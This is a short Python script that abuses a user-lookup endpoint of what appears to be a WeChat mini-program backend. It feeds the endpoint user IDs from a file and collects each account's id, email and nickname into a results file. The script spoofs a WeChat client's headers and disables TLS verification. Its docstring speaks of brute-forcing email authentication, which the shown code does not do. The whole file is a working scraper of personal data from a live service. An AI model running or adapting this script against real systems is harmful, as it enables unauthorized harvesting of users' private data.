'''
F88K email authentication.

Brute force for validation, you may not pass the validation if your device cannot send enough request.
Ajust the threads number, the email and userId.
'''


import json
import threading
import requests


requests.packages.urllib3.disable_warnings()
base_url = "https://www.jumboxtech.com:8022/user/queryUser"
header = {
    'Host': 'www.jumboxtech.com:8022',
    'Connection': 'keep-alive',
    # 'Content-Length': '39',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; GM1900 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Safari/537.36 MMWEBID/9558 MicroMessenger/8.0.2.1860(0x28000234) Process/appbrand0 WeChat/arm32 Weixin Android Tablet NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
    'charset': 'utf-8',
    'Accept-Encoding': 'gzip,compress,br,deflate',
    'content-type': 'application/x-www-form-urlencoded',
    'Referer': 'https://servicewechat.com/wxf7f31446cd68367a/5/page-frame.html',
}
with open('article.txt', 'r', encoding='utf-8') as f:
    with open('result.txt', 'w', encoding='utf-8') as f2:
        article = f.read().splitlines()
        for line in article:
            user_id = line.split(',')[2]
            s = requests.session()
            s.keep_alive = False
            payload = f'userId={user_id}'
            req = s.post(base_url, headers=header, data=payload, verify=False)
            ob = json.loads(req.content.decode(encoding='utf-8'))
            id = ob['data']['id']
            email = ob['data']['email']
            nickname = ob['data']['nickname']
            f2.write(f'{id},{email},{nickname}\n')
            # print(req.content.decode(encoding='utf-8'))

# with open('final.txt', 'r', encoding='utf-8') as f:
#     with open('result.txt', 'a+', encoding='utf-8') as f2:
#         uid = f.read().splitlines()
#         for line in uid:
#             s = requests.session()
#             s.keep_alive = False
#             payload = f'userId={line}'
#             req = s.post(base_url, headers=header, data=payload, verify=False)
#             ob = json.loads(req.content.decode(encoding='utf-8'))
#             id = ob['data']['id']
#             email = ob['data']['email']
#             nickname = ob['data']['nickname']
#             f2.write(f'{id},{email},{nickname}\n')
#             # print(req.content.decode(encoding='utf-8'))